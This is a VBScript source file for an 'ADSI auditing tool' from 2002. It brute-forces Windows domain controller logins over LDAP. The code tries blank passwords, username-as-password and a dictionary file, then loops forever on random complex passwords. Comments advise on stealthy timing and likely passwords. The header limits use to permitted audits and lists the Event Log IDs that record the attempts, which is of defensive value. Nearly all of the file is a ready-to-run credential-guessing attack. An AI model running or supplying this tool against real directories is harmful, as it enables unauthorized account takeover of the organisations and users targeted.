'*********************************************************************************
' Script Name: ADSI_Auditing_Tool.vbs
'     Version: 2.0
'      Author: Jason Fossen, Enclave Consulting LLC 
'Last Updated: 7/17/02
'     Purpose: Tries all possible username/password combinations from two input
'              text files to log into a target Windows 2000 DC over LDAP.  It also
'              tries a blank password, a password identical to username, and then
'              it will run endlessly guesing random passwords until you Ctrl-C it.
'       Usage: Script takes three arguments: targetIP, userfile, passwordfile.
'              Also, modify the iMilliseconds constant to alter script speed if desired.
'              Modify bStopOnSuccess, bShowFailures, iPasswordLength below as commented.
'        Note: Run this with CSCRIPT.EXE, not WSCRIPT.EXE!  
'        Note: "Audit Account Logon Events" to see in Event Log (Event ID 681).  "Audit
'              Directory Service Access" only records the successes, and these are normal.
'              "Audit Logon Events" will show the failures too (Event ID 529).  The
'              guest account is automatically tried too, so you'll see events for that.
'              If the guest account is disabled, the error is Event ID 531.
'       Legal: Public Domain.  Modify and redistribute freely.  No rights reserved.
'              Script provided "as is" without implied warranty or guarantee.  Use
'              at your own risk and only on networks with prior written permission.
'*********************************************************************************
On Error Resume Next

'Set the number of milliseconds in between each password attempt.  This is important to
'avoid flooding the network and to make the guessing more stealthy.  For stealth, set the
'number to at least 120000 (two minutes), but the script will still be very loud.  For 
'flood-avoidance, try 100 (1/10th second).
Const iMilliseconds = 0

'Set the length of the random passwords that will be guessed.  It is infeasible to try
'all typical lengths, but an LDAP query of the domain controller may reveal what the
'password policy is.  Set that minimum password length here.  The passwords generated
'will satisfy PASSFILT.DLL complexity requirements.  It is assumed that the easy passwords
'will have been put into the dictionary file for this script.  (Minimum = 4)
Const iPasswordLength = 6

'Specify whether you want to display failed username/password combinations (slower).
Const bShowFailures = True

'Specify whether you want to stop the script upon first successful guess.
Const bStopOnSuccess = False

Dim sTargetIP       'IP address of target DC.
Dim sUPNdomain      'UPN domain name used for logon attempts, e.g., "@mydomain.com".
Dim sDefaultNC      'DN of target domain Naming Context, e.g., "dc=mydomain,dc=com".
ReDim aUserNames(0) 'Array of usernames read from file.
ReDim aPasswords(0) 'Array of passwords read from file.


Call ProcessArguments(sTargetIP, aUserNames, aPasswords)
Call GetDefaultDomain(sTargetIP, sUPNdomain, sDefaultNC)
Call GuessCredentials(sTargetIP, sUPNdomain, aUserNames, aPasswords, sDefaultNC)



'*********************************************************************************
'Procedure Name: ProcessArguments()
'       Purpose: Validates command-line arguments and accessibility of required files.  
'                It will read usernames/passwords into the aUserNames and aPasswords
'                arrays.  
'    Depends On: No other sub.
'*********************************************************************************
Sub ProcessArguments(ByRef sTargetIP, ByRef aUserNames, ByRef aPasswords)
    On Error Resume Next
    
    If WScript.Arguments.Count <> 3 Then
        WScript.Echo "Three arguments required: TargetIP usernames.txt passwords.txt"
        WScript.Quit 
    End If

    sTargetIP = WScript.Arguments.Item(0)
    
    Set oFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
    
    Set oUserFile = oFileSystem.OpenTextFile(GetCurrentFolder() & WScript.Arguments.Item(1))
    Call CatchAnyErrorsAndQuit("Could not open file with usernames.")
    
    Set oPassFile = oFileSystem.OpenTextFile(GetCurrentFolder() & WScript.Arguments.Item(2))
    Call CatchAnyErrorsAndQuit("Could not open file with passwords.")
    
    i = 0
    Do While Not oUserFile.AtEndOfStream
        sWord = Trim(oUserFile.ReadLine)
        If sWord <> "" Then 
            ReDim Preserve aUserNames(i)
            aUserNames(i) = sWord
            i = i + 1
        End If
    Loop
    Call CatchAnyErrorsAndQuit("Problem parsing username file.")
    oUserFile.Close

    
    i = 0
    Do While Not oPassFile.AtEndOfStream
        sWord = Trim(oPassFile.ReadLine)
        If sWord <> "" Then 
            ReDim Preserve aPasswords(i)
            aPasswords(i) = sWord
            i = i + 1
        End If
    Loop
    Call CatchAnyErrorsAndQuit("Problem parsing password file.")
    oPassFile.Close
         
    Set oFileSystem = Nothing    
End Sub



'*********************************************************************************
'Procedure Name: GetDefaultDomain()
'       Purpose: Connects to RootDSE of target, extracts default naming context
'                distinguished name, assembles UPN domain name.
'    Depends On: Getting an IP address set from ProcessArguments().
'*********************************************************************************
Sub GetDefaultDomain(ByVal sTargetIP, ByRef sUPNdomain, ByRef sDefaultNC)
    On Error Resume Next
    
    Set Namespace = GetObject("LDAP:")        
    sRootDSEpath = "LDAP://" & sTargetIP & "/RootDSE"

    sUser = ""
    sPass = ""
    Set oRootDSE = Namespace.OpenDSObject(sRootDSEpath,sUser,sPass,0)

    Call CatchAnyErrorsAndQuit("Problem connecting to server.")

    oRootDSE.GetInfo
    'sDefaultNC = oRootDSE.Get("defaultNamingContext")  
    sDefaultNC = oRootDSE.Get("rootDomainNamingContext")  'Which naming context will work depends on the default UPN domain name at the target.  Try the rootDomainNamingContext first.
        
    sUPNdomain = Replace(sDefaultNC,",DC=",".")         
    sUPNdomain = Replace(sUPNdomain,",dc=",".")         'Notice the comma, these will not be the first domain(s) listed.
    sUPNdomain = Replace(sUPNdomain,"DC=","@",1,1)      'Starting at the first character, replace one "DC=" with "@" one time only.
    sUPNdomain = Replace(sUPNdomain,"dc=","@",1,1)
      
    Call CatchAnyErrorsAndQuit("Could not acquire default domain name.")
   
    Set oRootDSE = Nothing
    Set Namespace = Nothing
End Sub



'*********************************************************************************
'Procedure Name: GuessCredentials()
'       Purpose: Tries all possible combinations of usernames/passwords from the
'                input files, as well as blank passwords and passwords identical to
'                usernames.  Outputs to STDOUT in progress, so don't use WSCRIPT.EXE
'    Depends On: Getting an IP address, aUserNames and aPasswords arrays from 
'                ProcessArguments(), sUPNdomain and sDefaultNC from GetDefaultDomain().
'*********************************************************************************
Sub GuessCredentials(ByVal sTargetIP, ByVal sUPNdomain, ByRef aUserNames, ByRef aPasswords, ByVal sDefaultNC)
    On Error Resume Next
    Dim Namespace,oContainer,sPass,sGuess
        
    Set Namespace = GetObject("LDAP:")        
    sPath = "LDAP://" & sTargetIP & "/cn=Configuration," & sDefaultNC

   'Try a blank password first for all usernames to optimize and be optimistic.
    For Each sName In aUserNames
        Err.Clear 
        Set oContainer = Namespace.OpenDSObject(sPath,sName & sUPNdomain,"",0)
        If Err.Number = 0 Then 
            WScript.Echo "SUCCESS! " & sName & sUPNdomain & " ()" & vbCr
            If bStopOnSuccess Then WScript.Quit 
        Else
            If bShowFailures Then WScript.Echo "Failed: " & sName & sUPNdomain & " ()" & vbCr
        End If
        WScript.Sleep iMilliseconds
    Next
    
    
    'Try setting the password identical to the username.
    For Each sName In aUserNames
        Err.Clear 
        Set oContainer = Namespace.OpenDSObject(sPath,sName & sUPNdomain,sName,0)
        If Err.Number = 0 Then 
            WScript.Echo "SUCCESS! " & sName & sUPNdomain & " (" & sName & ")" & vbCr
            If bStopOnSuccess Then WScript.Quit 
        Else
            If bShowFailures Then WScript.Echo "Failed: " & sName & sUPNdomain & " (" & sName & ")" & vbCr
        End If
        WScript.Sleep iMilliseconds
    Next
    
    
    'Cycle through all passwords in text file list.
    For Each sPass In aPasswords     'Put the more likely passwords near the top of the file, e.g., god, love, sex, secret, etc..
        For Each sName In aUserNames 
            Err.Clear 
            Set oContainer = Namespace.OpenDSObject(sPath,sName & sUPNdomain,sPass,0)
            If Err.Number = 0 Then 
                WScript.Echo "SUCCESS! " & sName & sUPNdomain & " (" & sPass & ")" & vbCr
                If bStopOnSuccess Then WScript.Quit
            Else
                If bShowFailures Then WScript.Echo "Failed: " & sName & sUPNdomain & " (" & sPass & ")" & vbCr
            End If
            WScript.Sleep iMilliseconds
        Next 'username in list.
    Next 'password in list.


   'Try a random password of the iPasswordLength specified above.
    Do While True  'This section will run forever until you Ctrl-C to stop it.
        For Each sName In aUserNames
            Err.Clear 
            sGuess = RandomPassword(iPasswordLength)
            Set oContainer = Namespace.OpenDSObject(sPath,sName & sUPNdomain,sGuess,0)
            If Err.Number = 0 Then 
                WScript.Echo "SUCCESS! " & sName & sUPNdomain & " (" & sGuess & ")" & vbCr
                If bStopOnSuccess Then WScript.Quit 
            Else
                If bShowFailures Then WScript.Echo "Failed: " & sName & sUPNdomain & " (" & sGuess & ")" & vbCr
            End If
            WScript.Sleep iMilliseconds
        Next
    Loop
End Sub



'*********************************************************************************
' Helper Procedures and Functions
'*********************************************************************************
Function RandomPassword(iLength)
    Dim sPassword,bHasUpper,bHasLower,bHasNumber,bHasNonAlpha,bIsStrong,i,x
    Call Randomize()                    'This initializes the random number generator with a number based on the system timer.
    If iLength < 4 Then iLength = 4     'Password must be at least 4 characters long in order to satisfy complexity requirements.
    
    Do
        sPassword = ""        
        bHasUpper =     False   'Has uppercase letter character flag.
        bHasLower =     False   'Has lowercase letter character flag.
        bHasNumber =    False   'Has number character flag.
        bHasNonAlpha =  False   'Has non-alphanumeric character flag.
        bIsStrong =     False   'Assume password is not strong until tested otherwise.
        
        For i = 1 To iLength     
            x = Int((((126 - 34) + 1) * Rnd()) + 34)    'Random ASCII number for valid range of password characters.
            If (x = 34) Or (x = 39) Then x = x - 1      'Eliminates two characters troublesome for scripts: ' and ".  This is also how it is possible to get "!" as a password character.
            sPassword = sPassword & Chr(x)              'Convert ASCII number to a character.

            If (x >= 65) And (x <= 90)  Then bHasUpper = True
            If (x >= 97) And (x <= 122) Then bHasLower = True 
            If (x >= 48) And (x <= 57)  Then bHasNumber = True
            If ((x >= 33) And (x <= 47)) Or _
               ((x >= 58) And (x <= 64)) Or _
               ((x >= 91) And (x <= 96)) Or _
               ((x >= 123) And (x <= 126))  _
               Then bHasNonAlpha = True

            If bHasUpper And bHasLower And bHasNumber And bHasNonAlpha Then 
                bIsStrong = True
            End If
        Next
        
    Loop Until bIsStrong
    
    RandomPassword = sPassword
End Function


Sub CatchAnyErrorsAndQuit(msg)
	If Err.Number <> 0 Then
		sOutput = vbCrLf
		sOutput = sOutput &  "ERROR:             " & msg & vbCrLf 
		sOutput = sOutput &  "Error Number:      " & Err.Number & vbCrlf
		sOutput = sOutput &  "Error Description: " & Err.Description & vbCrLf
		sOutput = sOutput &  "Error Source:      " & Err.Source & vbCrLf 
		sOutput = sOutput &  "Script Name:       " & WScript.ScriptName & vbCrLf 
		sOutput = sOutput &  vbCrLf
		
        WScript.Echo sOutput
		WScript.Quit Err.Number
	End If 
End Sub 


Function GetCurrentFolder()
	strFN = WScript.ScriptFullName
	GetCurrentFolder = Left(strFN, InstrRev(strFN, "\"))
End Function 


'END OF SCRIPT ******************************************************************
